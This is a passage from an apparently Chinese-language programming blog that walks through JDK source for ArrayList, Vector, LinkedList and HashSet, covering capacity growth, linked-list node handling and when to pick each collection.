class="doctag">@return</span> &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;<span class="doctag">@link</span> Collection#add&#125;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        elementData[size++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在boolean add(E e)方法中，先执行ensureCapacityInternal(size + 1)方法确定是否要扩容，然后再执行赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureCapacityInternal</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">            minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">    ensureExplicitCapacity(minCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在ensureCapacityInternal()方法中 先确定elementData是否为空数组，如果为空数组，返回DEFAULT_CAPACITY(默认为10) 和 minCapacity(第一次为1) 中的最大值，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureExplicitCapacity</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        modCount++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在ensureExplicitCapacity(int minCapacity)方法中确定是否真的扩容<br>modCount++ ：记录集合修改次数<br>minCapacity - elementData.length &gt; 0 ：如果数组所需最小容量 - 数组当前实际大小 大于 0 则执行扩容</p><p>grow()方法执行扩容</p><ol><li>将elementData.length 记录到 oldCapacity中，第一次值为0</li><li>newCapacity &#x3D; oldCapacity + (oldCapacity &gt;&gt; 1); 执行扩容，扩容大小为 数组当前容量+数组当前大小右移1位(除以2)，即扩容1.5倍</li><li>因为第一次扩容oldCapacity 为0 ,newCapacity 也为0，执行<br>if (newCapacity - minCapacity &lt; 0) newCapacity &#x3D; minCapacity;<br>此时newCapacity 为 10，所以第一次扩容大小为 10</li><li>elementData &#x3D; Arrays.copyOf(elementData, newCapacity);<br>Arrays.copyOf()方法可保留原先数据扩容<br>执行Arrays.copyOf()方法进行扩容，第一次执行完elementData 中有10个空数据</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Increases the capacity to ensure that it can hold at least the</span></span><br><span class="line"><span class="comment">     * number of elements specified by the minimum capacity argument.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> minCapacity the desired minimum capacity</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> elementData.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>扩容完成后，继续执行add()方法，将数据添加到elementData数组中</p><h2 id="Vector-底层结构和源码分析"><a href="#Vector-底层结构和源码分析" class="headerlink" title="Vector 底层结构和源码分析"></a>Vector 底层结构和源码分析</h2><h3 id="Vector-基本介绍"><a href="#Vector-基本介绍" class="headerlink" title="Vector 基本介绍"></a>Vector 基本介绍</h3><ol><li>Vector 底层也是一个对象数组，protected Object[] elementData;</li><li>Vector 是线程同步的，即线程安全，Vector 类的操作方法带有synchronized</li><li>在开发中，需要线程同步安全时，考虑使用Vector.<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">    elementData[elementCount++] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="Vector-和-ArrayList的比较"><a href="#Vector-和-ArrayList的比较" class="headerlink" title="Vector 和 ArrayList的比较"></a>Vector 和 ArrayList的比较</h3><table><thead><tr><th></th><th>底层结构</th><th>版本</th><th>线程安全（同步）效率</th><th>扩容倍数</th></tr></thead><tbody><tr><td>ArrayList</td><td>可变数组</td><td>jdk1.2</td><td>不安全，效率高</td><td>如果有参构造1.5倍，如果是无参 第一次10 , 从第二次开始按1.5倍扩容</td></tr><tr><td>Vector</td><td>可变数组</td><td>jdk1.0</td><td>安全，效率不高</td><td>如果是无参，默认10，满后，就按2倍扩容。如果指定大小，则每次直接按2倍扩容</td></tr></tbody></table><h3 id="Vector-源码分析"><a href="#Vector-源码分析" class="headerlink" title="Vector 源码分析"></a>Vector 源码分析</h3><p>创建Vector对象，并循环添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vector_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        无参构造 创建对象</span></span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            vector.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建Vector 对象，首先执行无参构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>(<span class="number">10</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>(initialCapacity, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>所以 new Vector() 会默认创建 容量为10的 对象</p><p>add 方法添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">     modCount++;</span><br><span class="line">     ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">     elementData[elementCount++] = e;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>首先执行ensureCapacityHelper() 方法判断是否要扩容。</p><p>如果数组所需最小容量大于当前数组容量，执行grow()方法扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureCapacityHelper</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">        grow(minCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow()方法源码：</p><p>默认扩容两倍大小。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> elementData.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + ((capacityIncrement &gt; <span class="number">0</span>) ?</span><br><span class="line">                                         capacityIncrement : oldCapacity);</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也可指定扩容大小。在vector带参构造器中指定扩容大小</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">int</span> capacityIncrement)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    <span class="built_in">this</span>.elementData = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    <span class="built_in">this</span>.capacityIncrement = capacityIncrement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LinkedList-底层结构"><a href="#LinkedList-底层结构" class="headerlink" title="LinkedList 底层结构"></a>LinkedList 底层结构</h2><h3 id="LinkedList-基本介绍"><a href="#LinkedList-基本介绍" class="headerlink" title="LinkedList 基本介绍"></a>LinkedList 基本介绍</h3><ol><li>LinkedList底层实现了双向链表和双端队列特点</li><li>可以添加任意元素（元素可以重复），包括null</li><li>线程不安全，没有实现同步</li></ol><h3 id="LinkedList-的底层操作机制"><a href="#LinkedList-的底层操作机制" class="headerlink" title="LinkedList 的底层操作机制"></a>LinkedList 的底层操作机制</h3><ol><li>LinkedList 底层维护了一个双向链表</li><li>LinkedList中维护了两个属性 first 和 last 分别指向 首节点和尾节点</li><li>每个节点（Node对象），里面又维护了prev、next、item、三个属性，其中通过prev指向前一个，通过next指向后一个节点。最终实现双向链表。</li><li>LinkedList的元素的添加和删除，不是通过数组完成的，相对来说效率较高。</li></ol><h3 id="LinkedList-源码分析"><a href="#LinkedList-源码分析" class="headerlink" title="LinkedList 源码分析"></a>LinkedList 源码分析</h3><p><strong>LinkedList的增删改查案例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedListCRUD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">LinkedList</span> <span class="variable">linkedList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        linkedList.add(<span class="number">1</span>);</span><br><span class="line">        linkedList.add(<span class="number">2</span>);</span><br><span class="line">        linkedList.add(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;linkedList=&quot;</span>+linkedList);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        删除节点,默认删除首节点</span></span><br><span class="line">        linkedList.remove();</span><br><span class="line">        System.out.println(<span class="string">&quot;linkedList=&quot;</span>+linkedList);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        修改某个节点对象</span></span><br><span class="line">        linkedList.set(<span class="number">0</span>,<span class="number">666</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;linklist=&quot;</span>+linkedList);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        得到某个节点对象</span></span><br><span class="line"><span class="comment">//        get(1)为第二个对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> linkedList.get(<span class="number">1</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        LinkedList 实现 List 接口 遍历可是迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;====linkedList迭代器遍历&quot;</span>);</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> linkedList.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">next</span> <span class="operator">=</span>  iterator.next();</span><br><span class="line">            System.out.println(next);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;====增强for循环遍历&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object o1 : linkedList) &#123;</span><br><span class="line">            System.out.println(o1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;====传统for循环&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; linkedList.size(); i++) &#123;</span><br><span class="line">            System.out.println(linkedList.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>LinkedList 添加元素</strong><br>创建集合对象 LinkedList linkedList &#x3D; new LinkedList();</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructs an empty list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化双向链表</p><p>执行add()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    linkLast(e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将新的节点，加入到双向链表的最后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">linkLast</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(l, e, <span class="literal">null</span>);</span><br><span class="line">        last = newNode;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="literal">null</span>)</span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>LinkedList 删除元素</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> removeFirst();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让 f 指向 首节点，判断首节点是否为空；</p><p>如果为空，抛出异常；</p><p>如果不为空，执行删除操作；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">removeFirst</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">       <span class="keyword">if</span> (f == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">       <span class="keyword">return</span> unlinkFirst(f);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>执行删除操作</p><p>将 首节点置空，first指向下一个节点，下一个节点的prev指向空，即将下一个节点调整为首节点，原首节点有GC算法回收。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> E <span class="title function_">unlinkFirst</span><span class="params">(Node&lt;E&gt; f)</span> &#123;</span><br><span class="line">        <span class="comment">// assert f == first &amp;&amp; f != null;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">E</span> <span class="variable">element</span> <span class="operator">=</span> f.item;</span><br><span class="line">        <span class="keyword">final</span> Node&lt;E&gt; next = f.next;</span><br><span class="line">        f.item = <span class="literal">null</span>;</span><br><span class="line">        f.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">        first = next;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">null</span>)</span><br><span class="line">            last = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            next.prev = <span class="literal">null</span>;</span><br><span class="line">        size--;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ArrayList-和-LinkedList-比较"><a href="#ArrayList-和-LinkedList-比较" class="headerlink" title="ArrayList 和 LinkedList 比较"></a>ArrayList 和 LinkedList 比较</h3><table><thead><tr><th></th><th>底层结构</th><th>增删效率</th><th>改查效率</th></tr></thead><tbody><tr><td>ArrayList</td><td>可变数组</td><td>较低，数组扩容</td><td>较高</td></tr><tr><td>LinkedList</td><td>双向链表</td><td>较高，通过链表追加</td><td>较低</td></tr></tbody></table><p>如何选择ArrayList和LinkedList:</p><p>如果改查的操作较多，选择ArrayList<br>如果增删的操作较多，选择LinkedList<br>一般来说，程序中，80%-90%都是查询，因此大部分情况下选择ArrayList<br>在一个项目中，根据业务灵活选择，也可能这样，一个模块使用的是ArrayList,另外一个模块是LinkedList。根据业务合理选择。</p><h2 id="set接口和常用方法"><a href="#set接口和常用方法" class="headerlink" title="set接口和常用方法"></a>set接口和常用方法</h2><h3 id="set接口基本介绍"><a href="#set接口基本介绍" class="headerlink" title="set接口基本介绍"></a>set接口基本介绍</h3><ol><li>无序（添加和取出的顺序不一致），没有索引</li><li>不允许重复元素，所以最多包含一个null</li></ol><h3 id="set接口常用方法"><a href="#set接口常用方法" class="headerlink" title="set接口常用方法"></a>set接口常用方法</h3><p>和List接口一样，set接口也是Collection的子接口，因此，常用方法和Collection接口一样</p><h3 id="set接口的遍历方式"><a href="#set接口的遍历方式" class="headerlink" title="set接口的遍历方式"></a>set接口的遍历方式</h3><p>同Collection的遍历方法一样，因为set接口是Collection接口的子接口。</p><ol><li>可以使用迭代器</li><li>增强for</li><li>不能使用索引的方式遍历</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        以set接口的实现子类 HashSet举例 set接口方法</span></span><br><span class="line"><span class="comment">//        1. set接口的实现类（Set接口对象），不能存放重复的元素，可以添加一个null</span></span><br><span class="line"><span class="comment">//        2. set接口对象存放的数据是无序的（即添加的顺序和取出的顺序不一致）</span></span><br><span class="line"><span class="comment">//        3. 注意：取出的顺序虽然不是添加的顺序，但是它是固定的。</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">        set.add(<span class="literal">null</span>);</span><br><span class="line">        set.add(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(set);</span><br><span class="line"><span class="comment">//        遍历</span></span><br><span class="line"><span class="comment">//        1. 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;====迭代器遍历&quot;</span>);</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">next</span> <span class="operator">=</span>  iterator.next();</span><br><span class="line">            System.out.println(next);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//         2. 增强for遍历</span></span><br><span class="line">        System.out.println(<span class="string">&quot;====增强for遍历&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object o : set) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        set接口对象，不能通过索引来获取，无法使用 普通for循环遍历</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><h3 id="Hash基本介绍"><a href="#Hash基本介绍" class="headerlink" title="Hash基本介绍"></a>Hash基本介绍</h3><ul><li>HashSet 实现了Set接口</li><li>HashSet 实际上是HashMap<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructs a new, empty set; the backing &lt;tt&gt;HashMap&lt;/tt&gt; instance has</span></span><br><span class="line"><span class="comment"> * default initial capacity (16) and load factor (0.75).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HashSet</span><span class="params">()</span> &#123;</span><br><span class="line">    map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>可以存放null值，但是只能有一个null</li><li>HashSet不保证元素是有序的，取决于hash值，再确定索引的结果</li><li>不能有重复元素&#x2F;对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 